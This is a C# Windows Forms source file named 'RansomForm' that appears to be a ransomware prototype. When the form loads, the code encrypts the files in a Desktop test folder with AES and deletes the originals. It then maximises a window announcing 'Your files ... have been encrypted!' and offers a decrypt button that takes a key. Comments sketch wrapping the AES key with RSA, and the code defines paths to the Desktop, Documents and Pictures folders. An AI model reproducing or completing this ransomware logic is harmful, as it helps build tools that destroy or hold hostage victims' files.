using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;

namespace RansomForm
{
    public partial class Form1 : Form
    {

        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

        private static int encryptedFileCount = 0;
        private static int decryptedFileCount = 0;

        private const string ENCRYPT_PASSWORD = "Password1"; // I Should generate it randomly
        private static string PKEY = ""; // RSA

        private const string ENCRYPTED_FILE_EXTENSION = ".encrypted";

        private static string ENCRYPTION_LOG = "";
        private static string DECRYPTION_LOG = "";

        private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
        private const bool DELETE_ENCRYPTED_FILE = true;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string passwordEncrypted = encryptAESKey(ENCRYPT_PASSWORD);
            encryptFolder(DESKTOP_FOLDER + "\\testfiles");
            formatFormPostEncryption();

            // Just Thinking:
            // To decrypt the aes password from a file with rsa privatekey, how do i know its the right aes password? (and dont use the 
            // wrong one to decrypt) ---> Check if aes password is a number? (So make my aes password only numbers)
        }

        private static string encryptAESKey(string password) // This is the AES password
        {
            string pubKey = PKEY; // RSA PKey
            byte[] bytes = Encoding.UTF8.GetBytes(password);
            string encryptedPassword;

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            try
            {
                rsa.FromXmlString(pubKey);
                byte[] inArray = rsa.Encrypt(bytes, true); //Using the RSA pkey, encrypt the AES password
                encryptedPassword = Convert.ToBase64String(inArray);
            }
            finally
            {
                rsa.PersistKeyInCsp = false;
            }

            return encryptedPassword;
        }

        private static bool fileIsEncrypted(string inputFile)
        {
            if (inputFile.Contains(ENCRYPTED_FILE_EXTENSION))
                if (inputFile.Substring(inputFile.Length - ENCRYPTED_FILE_EXTENSION.Length, ENCRYPTED_FILE_EXTENSION.Length) == ENCRYPTED_FILE_EXTENSION)
                    return true;
            return false;
        }

        private void encryptFolder(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Console.Out.WriteLine("Encrypting: " + f);
                        fileEncrypt(f, ENCRYPT_PASSWORD);
                    }
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private void decryptFolder(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                {
                    if (f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Console.Out.WriteLine("Decrypting: " + f);
                        fileDecrypt(f, f.Substring(0, f.Length - ENCRYPTED_FILE_EXTENSION.Length), textKeyEnter.Text);
                    }
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void fileEncrypt(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();

            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);

            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CBC;

            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);


            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                ENCRYPTION_LOG += inputFile + "\n";
                encryptedFileCount++;
                cs.Close();
                fsCrypt.Close();
                if (DELETE_ALL_ORIGINALS)
                {
                    File.Delete(inputFile);
                }
            }
        }

        private void fileDecrypt(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents();
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                fsCrypt.Close();
                if (DELETE_ENCRYPTED_FILE)
                    File.Delete(inputFile);
                DECRYPTION_LOG += inputFile + "\n";
                decryptedFileCount++;
            }
        }
        private void formatFormPostEncryption()
        {
            this.Opacity = 100;
            this.WindowState = FormWindowState.Maximized;
            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
            encryptedFileslbl.Text = ENCRYPTION_LOG;
        }
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }
            return data;
        }

        private void buttonDecrypt_Click(object sender, EventArgs e)
        {
            decryptFolder(DESKTOP_FOLDER + "\\testfiles");
        }
    }
}